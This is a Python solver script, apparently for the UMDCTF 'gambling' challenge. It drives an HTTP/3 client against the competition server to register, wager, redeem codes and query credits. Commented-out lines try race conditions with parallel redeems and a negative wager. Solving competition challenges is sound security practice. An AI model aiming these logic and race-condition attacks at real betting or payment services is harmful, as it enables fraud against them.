import argparse
import asyncio
import contextlib
import logging
import os
import pickle
import random
import ssl
import string
import subprocess
import time
from collections import deque
from typing import AsyncIterator, Deque, Dict, Optional, Tuple, cast
from urllib.parse import urlparse

import httpx
from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import DataReceived, H3Event, Headers, HeadersReceived
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import QuicEvent
from aioquic.quic.logger import QuicFileLogger

logger = logging.getLogger("client")

HOST = "gambling.challs.umdctf.io"
PORT = 443
# FORCE_END_STREAM = ""
FORCE_END_STREAM = "</html>"
# FORCE_END_STREAM_HEADER = "201 Created"
FORCE_END_STREAM_STATUS_CODE = [403,401,201]

class H3ResponseStream(httpx.AsyncByteStream):
    def __init__(self, aiterator: AsyncIterator[bytes]):
        self._aiterator = aiterator

    async def __aiter__(self) -> AsyncIterator[bytes]:
        async for part in self._aiterator:
            yield part




def save_session_ticket(ticket):
    """
    Callback which is invoked by the TLS engine when a new session ticket
    is received.
    """
    logger.info("New session ticket received")
    logger.info("ticker: %s", ticket)
    if args.session_ticket:
        with open(args.session_ticket, "wb") as fp:
            pickle.dump(ticket, fp)


class H3Transport(QuicConnectionProtocol, httpx.AsyncBaseTransport):
    def __init__(self, *args, **kwargs) -> None:
        super().__init__(*args, **kwargs)

        self._http = H3Connection(self._quic)
        self._read_queue: Dict[int, Deque[H3Event]] = {}
        self._read_ready: Dict[int, asyncio.Event] = {}

    # async def handle_spoof_request(self):
        
    async def handle_async_request(self, request: httpx.Request) -> httpx.Response:
        assert isinstance(request.stream, httpx.AsyncByteStream)

        stream_id = self._quic.get_next_available_stream_id()
        self._read_queue[stream_id] = deque()
        self._read_ready[stream_id] = asyncio.Event()

        # prepare request
        self._http.send_headers(
            stream_id=stream_id,
            headers=[
                (b":method", request.method.encode()),
                (b":scheme", request.url.raw_scheme),
                (b":authority", request.url.netloc),
                (b":path", request.url.raw_path),
            ]
            + [
                (k.lower(), v)
                for (k, v) in request.headers.raw
                if k.lower() not in (b"connection", b"host")
            ],
        )
        async for data in request.stream:
            self._http.send_data(stream_id=stream_id, data=data, end_stream=False)
            
        
        datagrams = self._quic.datagrams_to_send()
        self._http.send_data(stream_id=stream_id, data=b"", end_stream=True)

        # transmit request
        self.transmit()

        # process response
        status_code, headers, stream_ended = await self._receive_response(stream_id)

        return httpx.Response(
            status_code=status_code,
            headers=headers,
            stream=H3ResponseStream(
                self._receive_response_data(stream_id, stream_ended)
            ),
            extensions={
                "http_version": b"HTTP/3",
            },
        )

    def http_event_received(self, event: H3Event):
        if isinstance(event, (HeadersReceived, DataReceived)):
            stream_id = event.stream_id
            if stream_id in self._read_queue:
                self._read_queue[event.stream_id].append(event)
                self._read_ready[event.stream_id].set()

    def quic_event_received(self, event: QuicEvent):
        #  pass event to the HTTP layer
        if self._http is not None:
            for http_event in self._http.handle_event(event):
                self.http_event_received(http_event)

    async def _receive_response(self, stream_id: int) -> Tuple[int, Headers, bool]:
        """
        Read the response status and headers.
        """
        stream_ended = False
        while True:
            event = await self._wait_for_http_event(stream_id)
            if isinstance(event, HeadersReceived):
                stream_ended = event.stream_ended
                break

        headers = []
        status_code = 0
        for header, value in event.headers:
            if header == b":status":
                status_code = int(value.decode())
                for x in FORCE_END_STREAM_STATUS_CODE:
                    if status_code == x:
                        stream_ended = True
               
            else:
                headers.append((header, value))
        return status_code, headers, stream_ended

    async def _receive_response_data(
        self, stream_id: int, stream_ended: bool
    ) -> AsyncIterator[bytes]:
        """
        Read the response data.
        """
        while not stream_ended:
            event = await self._wait_for_http_event(stream_id)
            if isinstance(event, DataReceived):
                stream_ended = event.stream_ended
                # print('event.stream_ended: ', stream_ended)
                if FORCE_END_STREAM != "":
                    if FORCE_END_STREAM in event.data.decode():
                        stream_ended = True
                yield event.data
            elif isinstance(event, HeadersReceived):
                stream_ended = event.stream_ended

    async def _wait_for_http_event(self, stream_id: int) -> H3Event:
        """
        Returns the next HTTP/3 event for the given stream.
        """
        if not self._read_queue[stream_id]:
            await self._read_ready[stream_id].wait()
        event = self._read_queue[stream_id].popleft()
        # print('event: ', event)
        if not self._read_queue[stream_id]:
            self._read_ready[stream_id].clear()
        # self.transmit()
        return event



async def main(
    configuration: QuicConfiguration,
    url: str,
) -> None:
    # parse URL
    if url.startswith("https://"):
        parsed = urlparse(url)
        assert parsed.scheme == "https", "Only https:// URLs are supported."
        host = parsed.hostname
        if parsed.port is not None:
            port = parsed.port
        else:
            port = 443
    else:
        host = HOST
        port = PORT

    async with connect(
        host,
        port,
        configuration=configuration,
        create_protocol=H3Transport,
    
        session_ticket_handler=save_session_ticket,
    ) as transport:
        logger.info('Starting the solver')
        async with httpx.AsyncClient(
            transport=cast(httpx.AsyncBaseTransport, transport),
            
        ) as client:
            transport.handle_async_request
            start = time.time()
            api =  ApiInteract(url, client)
            username = ''.join(random.choice(string.ascii_letters) for _ in range(100))
            username2 = ''.join(random.choice(string.ascii_letters) for _ in range(50))
            await api.register(username, 'alhamcok1234123411')
            # await api.redeem("eW91IHRoaW5rIHlvdSdyZSBzcGVjaWFsIGJlY2F1c2UgeW91IGtub3cgaG93IHRvIGRlY29kZSBiYXNlNjQ/")
            # await api.register(username2, 'alhamcok1234123411')
            # await api.redeem("eW91IHRoaW5rIHlvdSdyZSBzcGVjaWFsIGJlY2F1c2UgeW91IGtub3cgaG93IHRvIGRlY29kZSBiYXNlNjQ/")
            # await api.useProxy()
            # await asyncio.gather(
            #     api.redeem("eW91IHRoaW5rIHlvdSdyZSBzcGVjaWFsIGJlY2F1c2UgeW91IGtub3cgaG93IHRvIGRlY29kZSBiYXNlNjQ/"),
            #     api.redeem("eW91IHRoaW5rIHlvdSdyZSBzcGVjaWFsIGJlY2F1c2UgeW91IGtub3cgaG93IHRvIGRlY29kZSBiYXNlNjQ/"),
            #     api.wager(-100),
            #     api.wager(100)
            #     # api.useSocketsoOurIpChangedMidRequestInRedeem()
            # )
            await api.wager("100")

            await api.credits()
            elapsed = time.time() - start
        logger.info("Request took %.3f seconds" % elapsed)

       

class ApiInteract():

    def __init__(self, Url, client:httpx.AsyncClient, ):
        self.c = client
        self.c.base_url = Url


    async def useProxy(self, proxy = "socks5://localhost:1080"):
        self.c.proxies = proxy
        
    async def register(self,username,password):
        self.username = username
        self.password = password
        r = await self.c.post('/register', json={
            "username":self.username,
            "password":self.password
        })
        self.auth = '{"username":"%s","password":"%s"}' % (self.username, self.password)
        self.c.headers = {
            "authorization":  self.auth
        }
        logger.info(
                "Respond-Register %s", r.text
        )
    
    async def login(self, username="", password="", printResp:bool = True):
        if username=="":
            username = self.username
        if password=="":
            password = self.password
        r = await self.c.post('/login', json={
            "username":username,
            "password":password
        })
        if printResp:
            logger.info(
                "Respond-Login %s", r.text
            )
        
    async def credits(self):
        r = await self.c.get('/credits')
        # if 'Gambling Dashboard' in r.text:
        if r.text != '':
            logger.info(
                "Respond-Credits '%s'", r.text
            )
        
    async def redeem(self, codeRedeem:str):
        r = await self.c.post('/redeem', data='"%s"' % codeRedeem)
        if r.text != '':
            logging.info(
                "Respond-Redeem %s", r.text
            )
            
    async def flag(self):
        r = await self.c.post('/flag')
        if r.text != '':
            logging.info(
                "Respond-Flag %s", r.text
            )
        
    async def wager(self,total):
        r = await self.c.post(
                '/wager',
                data=total
            )
        if r.text != '':

            logging.info(
                "Respond-Wager '%s' from wager", r.text
            )
        
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP/3 Quic client solver")
    parser.add_argument("url", type=str, help="the URL to query (must be HTTPS)")
    parser.add_argument(
        "--ca-certs", type=str, help="load CA certificates from the specified file"
    )
    parser.add_argument(
        "-k",
        "--insecure",
        action="store_true",
        help="do not validate server certificate",
    )
    parser.add_argument(
        "-q",
        "--quic-log",
        type=str,
        help="log QUIC events to QLOG files in the specified directory",
    )
    parser.add_argument(
        "-l",
        "--secrets-log",
        type=str,
        help="log secrets to a file, for use with Wireshark",
    )
    parser.add_argument(
        "-s",
        "--session-ticket",
        type=str,
        help="read and write session ticket from the specified file",
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true", help="increase logging verbosity"
    )

    args = parser.parse_args()

    logging.basicConfig(
        format="%(asctime)s %(levelname)s %(name)s %(message)s",
        level=logging.DEBUG if args.verbose else logging.INFO,
    )


    # prepare configuration
    configuration = QuicConfiguration(is_client=True, alpn_protocols=H3_ALPN)
    if args.ca_certs:
        configuration.load_verify_locations(args.ca_certs)
    if args.insecure:
        configuration.verify_mode = ssl.CERT_NONE
    if args.quic_log:
        configuration.quic_logger = QuicFileLogger(args.quic_log)
    if args.secrets_log:
        configuration.secrets_log_file = open(args.secrets_log, "a")
    if args.session_ticket:
        try:
            with open(args.session_ticket, "rb") as fp:
                logging.info("Loaded session ticket from %s", args.session_ticket)
                configuration.session_ticket = pickle.load(fp)
        except FileNotFoundError:
            pass

    asyncio.run(
        main(
            configuration=configuration,
            url=args.url,
        )
    )